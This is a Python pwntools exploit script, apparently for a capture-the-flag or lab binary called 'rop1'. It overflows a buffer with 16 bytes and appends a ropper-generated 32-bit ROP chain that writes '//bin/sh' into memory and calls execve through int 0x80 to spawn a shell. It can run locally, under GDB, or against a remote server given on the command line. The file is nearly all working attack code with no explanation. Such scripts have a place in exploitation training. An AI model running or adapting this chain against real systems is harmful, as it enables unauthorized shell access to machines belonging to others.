#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap
from struct import pack

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath], gdbscript=gdbscript, aslr=False)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath])


binPath="./rop1"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *Test+32
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="info"
io = start()

elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

# define payload
overFlow = b'A'*16

# ropper auto-ropchain script
p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0xf7db9000 # d28be87ecb6af58d894a265c6121535c41a530ebe0cea961cda3d6611f29a219
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x0002bc97) # 0x0002bc97: pop eax; ret;
rop += b'//bi'
rop += rebase_0(0x0003456c) # 0x0003456c: pop edx; ret;
rop += rebase_0(0x001eb040)
rop += rebase_0(0x0007d4da) # 0x0007d4da: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x0002bc97) # 0x0002bc97: pop eax; ret;
rop += b'n/sh'
rop += rebase_0(0x0003456c) # 0x0003456c: pop edx; ret;
rop += rebase_0(0x001eb044)
rop += rebase_0(0x0007d4da) # 0x0007d4da: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x0002bc97) # 0x0002bc97: pop eax; ret;
rop += p(0x00000000)
rop += rebase_0(0x0003456c) # 0x0003456c: pop edx; ret;
rop += rebase_0(0x001eb048)
rop += rebase_0(0x0007d4da) # 0x0007d4da: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x000216d2) # 0x000216d2: pop ebx; ret;
rop += rebase_0(0x001eb040)
rop += rebase_0(0x000da583) # 0x000da583: pop ecx; ret;
rop += rebase_0(0x001eb048)
rop += rebase_0(0x0003456c) # 0x0003456c: pop edx; ret;
rop += rebase_0(0x001eb048)
rop += rebase_0(0x0002bc97) # 0x0002bc97: pop eax; ret;
rop += p(0x0000000b)
rop += rebase_0(0x000ca166) # 0x000ca166: int 0x80; push ecx; cmp eax, 0xfffff001; jae 0x1ea20; ret;


payload = pwn.flat(
        [
           overFlow,
           rop
           ]
        )
pwn.info("Payload length: %d",len(payload))

io.sendline(payload)
io.interactive()

